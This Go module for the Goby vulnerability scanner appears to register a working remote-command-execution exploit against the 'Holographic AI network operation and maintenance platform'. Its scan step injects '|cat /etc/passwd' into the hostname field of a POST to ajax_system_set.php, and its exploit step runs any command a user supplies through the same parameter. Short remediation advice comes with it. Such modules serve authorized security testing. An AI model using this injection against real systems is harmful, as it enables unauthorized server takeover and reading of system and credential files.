package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Holographic AI network operation and maintenance platform RCE",
  "Description": "Holographic AI network operation and maintenance platform has command execution vulnerability, attackers can construct special requests to execute arbitrary commands  ",
  "Product": "Holographic AI network operation and maintenance platform",
  "Homepage": "http://www.tg-net.cn",
  "DisclosureDate": "2021-08-02",
  "Author": "luckying1314@139.com",
  "GobyQuery": "title=\"全息AI网络运维平台\"",
  "Level": "3",
  "Impact": "<ul><li><p>The ability to execute arbitrary code, control entire websites and even control servers</p></li></ul>",
  "Recommandation": "<p style=\"text-align: justify;\">1. Use functions that execute commands as little as possible or disable them directly</p><p style=\"text-align: justify;\">2. Parameter values should be included in quotation marks</p><p style=\"text-align: justify;\">3. Before using dynamic functions, ensure that the function you use is one of the specified functions</p><p style=\"text-align: justify;\">4. Filter parameters and escape sensitive characters before entering the function/method of the command</p>",
  "References": [
    "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4313"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "createSelect",
      "value": "whoami,id,cat /etc/passwd",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/nmss/toolMenu/Ajax/ajax_system_set.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "cmd=ping_hostname&hostname=|cat /etc/passwd&packet_size=0&count=0&haveEn=0"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/nmss/toolMenu/Ajax/ajax_system_set.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "cmd=ping_hostname&hostname=|{{{Cmd}}}&packet_size=0&count=0&haveEn=0"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "Holographic AI network operation and maintenance platform"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}